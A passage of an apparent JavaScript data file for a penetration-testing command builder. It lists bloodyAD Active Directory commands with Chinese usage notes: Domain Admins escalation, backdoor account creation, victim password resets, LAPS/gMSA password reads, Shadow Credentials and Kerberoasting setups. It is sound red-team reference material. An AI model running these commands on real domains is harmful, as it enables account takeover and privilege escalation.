          'bloodyAD -d corp.local -u lowpriv -p Password123 -H dc01.corp.local remove groupMember "Domain Admins" lowpriv',
      },
      {
        id: 'bloodyad-remove-object',
        title: 'remove object —— 删除对象',
        description: '删除用户/组/计算机/OU 等任意对象',
        build: (p) => `${buildBloodyADAuth(p)} remove object ${v('', 'TARGET')}`,
        usage: `语法: remove object <target>
target: 目标对象 (用户/组/计算机/OU 等) 的 sAMAccountName/DN/SID
用途: 清理攻击中创建的机器账户/后门账户 (如 remove object "EVILPC$")。`,
        example:
          'bloodyAD -d corp.local -u lowpriv -p Password123 -H dc01.corp.local remove object "EVILPC$"',
      },
      {
        id: 'bloodyad-remove-rbcd',
        title: 'remove rbcd —— 移除 RBCD 配置',
        description: '从目标上移除指定服务账户的 RBCD 条目',
        build: (p) =>
          `${buildBloodyADAuth(p)} remove rbcd ${v('', 'TARGET')} ${v('', 'SERVICE_ACCOUNT')}`,
        usage: `语法: remove rbcd <target> <service>
target: 目标对象的 sAMAccountName/DN/SID
service: 服务账户的 sAMAccountName/DN/SID
用途: RBCD 攻击完成后清理 msDS-AllowedToActOnBehalfOfOtherIdentity 中的条目。`,
        example:
          'bloodyAD -d corp.local -u lowpriv -p Password123 -H dc01.corp.local remove rbcd "SRV01$" "EVILPC$"',
      },
      {
        id: 'bloodyad-remove-shadowcredentials',
        title: 'remove shadowCredentials —— 移除密钥凭据',
        description: '从目标的 msDS-KeyCredentialLink 移除 Key Credentials',
        build: (p) => `${buildBloodyADAuth(p)} remove shadowCredentials ${v('', 'TARGET')}`,
        usage: `语法: remove shadowCredentials <target> [--key <RSA密钥>]
target: 目标的 sAMAccountName/DN/SID
--key: 要移除的 Key Credential 的 RSA 密钥；不指定则移除全部
用途: Shadow Credentials 攻击后清理写入的密钥凭据。`,
        example:
          'bloodyAD -d corp.local -u lowpriv -p Password123 -H dc01.corp.local remove shadowCredentials "SRV01$"',
      },
      {
        id: 'bloodyad-remove-uac',
        title: 'remove uac —— 移除 UAC 属性标志',
        description: '移除 userAccountControl 标志，如 LOCKOUT/ACCOUNTDISABLE',
        build: (p) =>
          `${buildBloodyADAuth(p)} remove uac ${v('', 'TARGET')} -f ${v('', 'FLAG')}`,
        usage: `语法: remove uac <target> [-f <FLAG> ...]
target: 目标用户/计算机的 sAMAccountName/DN/SID
-f: 要移除的属性标志名，可多次指定 (如 -f LOCKOUT -f ACCOUNTDISABLE)
用途: 解锁/启用账户 (移除 LOCKOUT/ACCOUNTDISABLE)，或撤销 add uac 加过的标志。`,
        example:
          'bloodyAD -d corp.local -u lowpriv -p Password123 -H dc01.corp.local remove uac victim -f ACCOUNTDISABLE',
      },
    ],
  },
  {
    id: 'bloodyad-msldap-info',
    name: 'bloodyAD msldap —— 信息查询类',
    category: 'bloodyAD',
    homepage: 'https://github.com/CravateRouge/bloodyAD',
    description: 'msldap 引擎的信息收集命令: whoami/查询/枚举委派/LAPS/gMSA/SPN/DNS/信任等',
    commands: [
      {
        id: 'bloodyad-msldap-whoami',
        title: 'msldap whoami —— 完整身份信息',
        description: '输出当前认证身份的完整 whoami 信息',
        build: (p) => `${buildBloodyADAuth(p)} msldap whoami`,
        usage: `语法: msldap whoami
无参数，返回当前连接的完整身份信息 (用户/SID/组等)
用途: 验证认证是否成功、确认当前上下文。`,
        example:
          'bloodyAD -d corp.local -u lowpriv -p Password123 -H dc01.corp.local msldap whoami',
      },
      {
        id: 'bloodyad-msldap-query',
        title: 'msldap query —— 原始 LDAP 查询',
        description: '对服务器执行原始 LDAP 查询',
        build: (p) =>
          `${buildBloodyADAuth(p)} msldap query ${v('', '(LDAP_QUERY)')} --attributes ${v('', 'ATTR1,ATTR2')}`,
        usage: `语法: msldap query <query> [--attributes <属性>]
query: LDAP 查询过滤器
--attributes: 要返回的属性，多个用逗号分隔 (默认 -)
用途: msldap 引擎下的通用 LDAP 查询入口。`,
        example:
          'bloodyAD -d corp.local -u lowpriv -p Password123 -H dc01.corp.local msldap query "(&(objectClass=user)(adminCount=1))" --attributes sAMAccountName,memberOf',
      },
      {
        id: 'bloodyad-msldap-dump',
        title: 'msldap dump —— 导出全部用户与机器账户',
        description: '导出域内所有用户和计算机账户及大量属性',
        build: (p) => `${buildBloodyADAuth(p)} msldap dump`,
        usage: `语法: msldap dump
无参数，拉取域内全部用户与机器账户及大量属性
用途: 一次性域账户盘点，输出量大建议重定向到文件。`,
        example:
          'bloodyAD -d corp.local -u lowpriv -p Password123 -H dc01.corp.local msldap dump',
      },
      {
        id: 'bloodyad-msldap-getsd',
        title: 'msldap getsd —— 读取安全描述符',
        description: '读取指定 DN 对象的安全描述符',
        build: (p) => `${buildBloodyADAuth(p)} msldap getsd ${v('', 'TARGET_DN')}`,
        usage: `语法: msldap getsd <dn> [--opts <选项>]
dn: 目标对象 DN
--opts: 附加选项 (默认空)
用途: 查看对象 DACL/所有者，分析 ACL 攻击路径。`,
        example:
          'bloodyAD -d corp.local -u lowpriv -p Password123 -H dc01.corp.local msldap getsd "CN=Domain Admins,CN=Users,DC=corp,DC=local"',
      },
      {
        id: 'bloodyad-msldap-user',
        title: 'msldap user —— 查询用户对象',
        description: '按 sAMAccountName 获取用户对象详情',
        build: (p) => `${buildBloodyADAuth(p)} msldap user ${v('', 'SAMACCOUNTNAME')}`,
        usage: `语法: msldap user <samaccountname>
samaccountname: 目标用户名
用途: 查看单个用户的完整 LDAP 属性。`,
        example:
          'bloodyAD -d corp.local -u lowpriv -p Password123 -H dc01.corp.local msldap user administrator',
      },
      {
        id: 'bloodyad-msldap-machine',
        title: 'msldap machine —— 查询计算机对象',
        description: '按 sAMAccountName 获取机器对象详情',
        build: (p) => `${buildBloodyADAuth(p)} msldap machine ${v('', 'MACHINE$')}`,
        usage: `语法: msldap machine <samaccountname>
samaccountname: 机器账户名 (通常带结尾 $)
用途: 查看单台计算机的 LDAP 属性 (操作系统/SPN/委派配置等)。`,
        example:
          'bloodyAD -d corp.local -u lowpriv -p Password123 -H dc01.corp.local msldap machine "SRV01$"',
      },
      {
        id: 'bloodyad-msldap-adinfo',
        title: 'msldap adinfo —— 域详细信息',
        description: '打印详细的 Active Directory 信息',
        build: (p) => `${buildBloodyADAuth(p)} msldap adinfo`,
        usage: `语法: msldap adinfo
无参数，打印域的详细信息 (功能级别/命名上下文等)
用途: 快速了解域环境基本面貌。`,
        example:
          'bloodyAD -d corp.local -u lowpriv -p Password123 -H dc01.corp.local msldap adinfo',
      },
      {
        id: 'bloodyad-msldap-groupmembers',
        title: 'msldap groupmembers —— 列出组成员',
        description: '返回指定 DN 组的所有成员用户',
        build: (p) =>
          `${buildBloodyADAuth(p)} msldap groupmembers ${v('', 'CN=Domain Admins,CN=Users,DC=domain,DC=local')}`,
        usage: `语法: msldap groupmembers <dn> [--recursive]
dn: 组的 DN
--recursive: 递归获取嵌套组成员 (默认开启)
用途: 盘点高价值组 (Domain Admins 等) 成员。`,
        example:
          'bloodyAD -d corp.local -u lowpriv -p Password123 -H dc01.corp.local msldap groupmembers "CN=Domain Admins,CN=Users,DC=corp,DC=local"',
      },
      {
        id: 'bloodyad-msldap-groupmembership',
        title: 'msldap groupmembership —— 查询对象所属组',
        description: '列出指定 DN 对象所属的所有组名',
        build: (p) =>
          `${buildBloodyADAuth(p)} msldap groupmembership ${v('', 'CN=user,CN=Users,DC=domain,DC=local')}`,
        usage: `语法: msldap groupmembership <dn>
dn: 目标对象 DN
用途: 查询某用户/计算机的组成员关系。`,
        example:
          'bloodyAD -d corp.local -u lowpriv -p Password123 -H dc01.corp.local msldap groupmembership "CN=lowpriv,CN=Users,DC=corp,DC=local"',
      },
      {
        id: 'bloodyad-msldap-dadms',
        title: 'msldap dadms —— 列出 Domain Admins 成员',
        description: '列出域管理员组的所有成员',
        build: (p) => `${buildBloodyADAuth(p)} msldap dadms`,
        usage: `语法: msldap dadms
无参数，列出 Domain Admins 组全部成员
用途: 快速确定域内最高价值目标账户。`,
        example:
          'bloodyAD -d corp.local -u lowpriv -p Password123 -H dc01.corp.local msldap dadms',
      },
      {
        id: 'bloodyad-msldap-unconstrained',
        title: 'msldap unconstrained —— 非约束委派对象',
        description: '列出所有配置了非约束委派的对象',
        build: (p) => `${buildBloodyADAuth(p)} msldap unconstrained`,
        usage: `语法: msldap unconstrained
无参数，列出所有非约束委派 (TrustedForDelegation) 对象
攻击场景: 找到非约束委派主机后可用打印机 bug/PetitPotam 强制 DC 认证到该主机抓取 TGT。`,
        example:
          'bloodyAD -d corp.local -u lowpriv -p Password123 -H dc01.corp.local msldap unconstrained',
      },
      {
        id: 'bloodyad-msldap-constrained',
        title: 'msldap constrained —— 约束委派对象',
        description: '列出所有配置了约束委派的对象',
        build: (p) => `${buildBloodyADAuth(p)} msldap constrained`,
        usage: `语法: msldap constrained
无参数，列出所有约束委派对象及其允许委派到的服务
攻击场景: 拿下约束委派账户后可用 S4U2Proxy (impacket-getST) 冒充用户访问其被允许的服务。`,
        example:
          'bloodyAD -d corp.local -u lowpriv -p Password123 -H dc01.corp.local msldap constrained',
      },
      {
        id: 'bloodyad-msldap-asrep',
        title: 'msldap asrep —— AS-REP 可 roasting 账户',
        description: '列出设置了 DONT_REQ_PREAUTH 的账户',
        build: (p) => `${buildBloodyADAuth(p)} msldap asrep`,
        usage: `语法: msldap asrep
无参数，列出所有不需要 Kerberos 预认证的账户
攻击场景: 这些账户可被 AS-REP roasting (impacket-GetNPUsers) 离线爆破。`,
        example:
          'bloodyAD -d corp.local -u lowpriv -p Password123 -H dc01.corp.local msldap asrep',
      },
      {
        id: 'bloodyad-msldap-laps',
        title: 'msldap laps —— 读取 LAPS 密码',
        description: '读取所有可读的 LAPS 本地管理员密码',
        build: (p) => `${buildBloodyADAuth(p)} msldap laps`,
        usage: `语法: msldap laps
无参数，列出当前用户有权限读取的所有 LAPS 密码
攻击场景: 有 ms-Mcs-AdmPwd 读权限时直接获取各主机本地管理员密码。`,
        example:
          'bloodyAD -d corp.local -u helpdesk -p Password123 -H dc01.corp.local msldap laps',
      },
      {
        id: 'bloodyad-msldap-gmsa',
        title: 'msldap gmsa —— 读取 gMSA 密码',
        description: '列出托管服务账户，有权限时直接读出密码',
        build: (p) => `${buildBloodyADAuth(p)} msldap gmsa`,
        usage: `语法: msldap gmsa
无参数，列出所有 MSA/gMSA；当前用户有权限时同时解析出其密码
攻击场景: 在 gMSA 的 PrincipalsAllowedToRetrieveManagedPassword 里时可读取其明文/哈希。`,
        example:
          'bloodyAD -d corp.local -u svc_reader -p Password123 -H dc01.corp.local msldap gmsa',
      },
      {
        id: 'bloodyad-msldap-spns',
        title: 'msldap spns —— Kerberoastable 账户',
        description: '列出带 SPN 的用户账户 (可 Kerberoasting)',
        build: (p) => `${buildBloodyADAuth(p)} msldap spns`,
        usage: `语法: msldap spns
无参数，列出所有设置了 SPN 的用户账户
攻击场景: 这些账户可被 Kerberoasting (impacket-GetUserSPNs -request) 离线爆破服务票据。`,
        example:
          'bloodyAD -d corp.local -u lowpriv -p Password123 -H dc01.corp.local msldap spns',
      },
      {
        id: 'bloodyad-msldap-dnsdump',
        title: 'msldap dnsdump —— 导出 DNS 记录',
        description: '执行 MSLDAPClientConsole 的 dnsdump 导出区域记录',
        build: (p) => `${buildBloodyADAuth(p)} msldap dnsdump`,
        usage: `语法: msldap dnsdump [--zone <区域>]
--zone: 指定要导出的 DNS 区域 (默认全部)
用途: 与 get dnsDump 类似的 DNS 记录导出，走 msldap 引擎。`,
        example:
          'bloodyAD -d corp.local -u lowpriv -p Password123 -H dc01.corp.local msldap dnsdump',
      },
      {
        id: 'bloodyad-msldap-trusts',
        title: 'msldap trusts —— 域信任关系',
        description: '返回域信任关系列表',
        build: (p) => `${buildBloodyADAuth(p)} msldap trusts`,
        usage: `语法: msldap trusts
无参数，列出域信任关系
用途: msldap 引擎下的信任枚举 (get trusts 的表格化版本)。`,
        example:
          'bloodyAD -d corp.local -u lowpriv -p Password123 -H dc01.corp.local msldap trusts',
      },
    ],
  },
  {
    id: 'bloodyad-msldap-modify',
    name: 'bloodyAD msldap —— 修改利用类',
    category: 'bloodyAD',
    homepage: 'https://github.com/CravateRouge/bloodyAD',
    description: 'msldap 引擎的修改/利用命令: 建账户/改密/改所有者/加 SPN/GenericWrite/Shadow Credentials',
    commands: [
      {
        id: 'bloodyad-msldap-setsd',
        title: 'msldap setsd —— 写入安全描述符',
        description: '用 SDDL 字符串整体替换目标对象的安全描述符',
        build: (p) =>
          `${buildBloodyADAuth(p)} msldap setsd ${v('', 'TARGET_DN')} ${v('', 'SDDL')}`,
        usage: `语法: msldap setsd <target_dn> <sddl>
target_dn: 目标对象 DN
sddl: SDDL 格式的完整安全描述符字符串
用途: 需要精确控制 DACL/SACL 时直接写入 SDDL (高危操作，会整体覆盖)。`,
        example:
          'bloodyAD -d corp.local -u admin -p Password123 -H dc01.corp.local msldap setsd "CN=victim,CN=Users,DC=corp,DC=local" "O:S-1-5-21-...-512D:(A;;GA;;;S-1-5-21-...-1105)"',
      },
      {
        id: 'bloodyad-msldap-addspn',
        title: 'msldap addspn —— 添加 SPN',
        description: '给用户账户添加 SPN 条目',
        build: (p) =>
          `${buildBloodyADAuth(p)} msldap addspn ${v('', 'USER_DN')} ${v(p.spn, 'SERVICE/host.domain.local')}`,
        usage: `语法: msldap addspn <user_dn> <spn>
user_dn: 目标用户 DN
spn: 要添加的 SPN (如 HTTP/fake.corp.local)
攻击场景: 对账户有写 SPN 权限时添加 SPN 使其变为 Kerberoastable (targeted Kerberoasting)。`,
        example:
          'bloodyAD -d corp.local -u lowpriv -p Password123 -H dc01.corp.local msldap addspn "CN=victim,CN=Users,DC=corp,DC=local" "HTTP/fake.corp.local"',
      },
      {
        id: 'bloodyad-msldap-delspn',
        title: 'msldap delspn —— 删除 SPN',
        description: '从用户账户删除 SPN 条目',
        build: (p) =>
          `${buildBloodyADAuth(p)} msldap delspn ${v('', 'USER_DN')} ${v(p.spn, 'SERVICE/host.domain.local')}`,
        usage: `语法: msldap delspn <user_dn> <spn>
user_dn: 目标用户 DN
spn: 要删除的 SPN
用途: targeted Kerberoasting 完成后清理添加的 SPN。`,
        example:
          'bloodyAD -d corp.local -u lowpriv -p Password123 -H dc01.corp.local msldap delspn "CN=victim,CN=Users,DC=corp,DC=local" "HTTP/fake.corp.local"',
      },
      {
        id: 'bloodyad-msldap-adduser',
        title: 'msldap adduser —— 创建域用户',
        description: '按 DN 创建新域用户并设置密码',
        build: (p) =>
          `${buildBloodyADAuth(p)} msldap adduser ${v('', 'CN=newuser,CN=Users,DC=domain,DC=local')} ${v('', 'PASSWORD')}`,
        usage: `语法: msldap adduser <user_dn> <password>
user_dn: 新用户的完整 DN
password: 新用户密码
用途: msldap 引擎下创建用户 (与 add user 类似但直接指定 DN)。`,
        example:
          'bloodyAD -d corp.local -u operator -p Password123 -H dc01.corp.local msldap adduser "CN=backdoor,CN=Users,DC=corp,DC=local" "Backdoor123!"',
      },
      {
        id: 'bloodyad-msldap-addcomputer',
        title: 'msldap addcomputer —— 创建计算机账户',
        description: '创建新机器账户 (MachineAccountQuota)',
        build: (p) =>
          `${buildBloodyADAuth(p)} msldap addcomputer --computername ${v('', 'COMPUTERNAME')} --password ${v('', 'PASSWORD')}`,
        usage: `语法: msldap addcomputer [--computername <名称>] [--password <密码>]
--computername: 计算机名
--password: 机器账户密码
攻击场景: 与 add computer 相同，为 RBCD 攻击准备可控机器账户。`,
        example:
          'bloodyAD -d corp.local -u lowpriv -p Password123 -H dc01.corp.local msldap addcomputer --computername EVILPC --password "EvilPass123!"',
      },
      {
        id: 'bloodyad-msldap-addusertogroup',
        title: 'msldap addusertogroup —— 加用户入组',
        description: '把用户加入指定组 (两者都必须是 DN 格式)',
        build: (p) =>
          `${buildBloodyADAuth(p)} msldap addusertogroup ${v('', 'CN=user,CN=Users,DC=domain,DC=local')} ${v('', 'CN=Domain Admins,CN=Users,DC=domain,DC=local')}`,
        usage: `语法: msldap addusertogroup <user_dn> <group_dn>
user_dn: 用户 DN
group_dn: 组 DN
注意: 两个参数都必须是 DN 格式
攻击场景: 与 add groupMember 相同的提权操作，走 msldap 引擎。`,
        example:
          'bloodyAD -d corp.local -u lowpriv -p Password123 -H dc01.corp.local msldap addusertogroup "CN=lowpriv,CN=Users,DC=corp,DC=local" "CN=Domain Admins,CN=Users,DC=corp,DC=local"',
      },
      {
        id: 'bloodyad-msldap-changeuserpw',
        title: 'msldap changeuserpw —— 修改用户密码',
        description: '修改用户密码，管理员可省略旧密码',
        build: (p) =>
          `${buildBloodyADAuth(p)} msldap changeuserpw ${v('', 'CN=user,CN=Users,DC=domain,DC=local')} ${v('', 'NEWPASS')}`,
        usage: `语法: msldap changeuserpw <user_dn> <newpass> [--oldpass <旧密码>]
user_dn: 目标用户 DN
newpass: 新密码
--oldpass: 旧密码；管理员权限时不需要提供
攻击场景: 与 set password 相同，用于账户接管。`,
        example:
          'bloodyAD -d corp.local -u lowpriv -p Password123 -H dc01.corp.local msldap changeuserpw "CN=victim,CN=Users,DC=corp,DC=local" "Hacked123!"',
      },
      {
        id: 'bloodyad-msldap-changeowner',
        title: 'msldap changeowner —— 修改对象所有者',
        description: '修改对象 (或其属性) 安全描述符中的所有者为指定 SID',
        build: (p) =>
          `${buildBloodyADAuth(p)} msldap changeowner ${v('', 'NEW_OWNER_SID')} ${v('', 'TARGET_DN')}`,
        usage: `语法: msldap changeowner <new_owner_sid> <target_dn> [--target-attribute <属性>]
new_owner_sid: 新所有者的 SID
target_dn: 目标对象 DN
--target-attribute: 指定时修改该属性的安全描述符所有者；省略则改对象 SD 所有者
攻击场景: 与 set owner 相同的 WriteOwner 利用: 夺所有权 -> 改 DACL -> GenericAll。`,
        example:
          'bloodyAD -d corp.local -u lowpriv -p Password123 -H dc01.corp.local msldap changeowner "S-1-5-21-1234567890-1234567890-1234567890-1105" "CN=Domain Admins,CN=Users,DC=corp,DC=local"',
      },
      {
        id: 'bloodyad-msldap-addgenericwrite',
        title: 'msldap add_genericwrite —— 添加 GenericWrite ACE',
        description: '给目标对象添加指定用户的 GenericWrite ACE',
        build: (p) =>
          `${buildBloodyADAuth(p)} msldap add_genericwrite ${v('', 'TARGET_DN')} ${v('', 'USER_DN')}`,
        usage: `语法: msldap add_genericwrite <targetdn> <userdn>
targetdn: 目标对象 DN
userdn: 获得 GenericWrite 权限的用户 DN
攻击场景: 有 WriteDacl 时给用户加 GenericWrite，进而改 SPN/属性。`,
        example:
          'bloodyAD -d corp.local -u lowpriv -p Password123 -H dc01.corp.local msldap add_genericwrite "CN=victim,CN=Users,DC=corp,DC=local" "CN=lowpriv,CN=Users,DC=corp,DC=local"',
      },
      {
        id: 'bloodyad-msldap-shadowcred',
        title: 'msldap shadowcred —— Shadow Credentials (msldap 版)',
        description: '执行 MSLDAPClientConsole 的 shadowcred 攻击',
        build: (p) => `${buildBloodyADAuth(p)} msldap shadowcred ${v('', 'TARGET_USER')}`,
        usage: `语法: msldap shadowcred <targetuser>
targetuser: 目标用户
攻击场景: 与 add shadowCredentials 相同的 msDS-KeyCredentialLink 攻击，走 msldap 引擎。`,
        example:
          'bloodyAD -d corp.local -u lowpriv -p Password123 -H dc01.corp.local msldap shadowcred "SRV01$"',
      },
    ],
  },
];
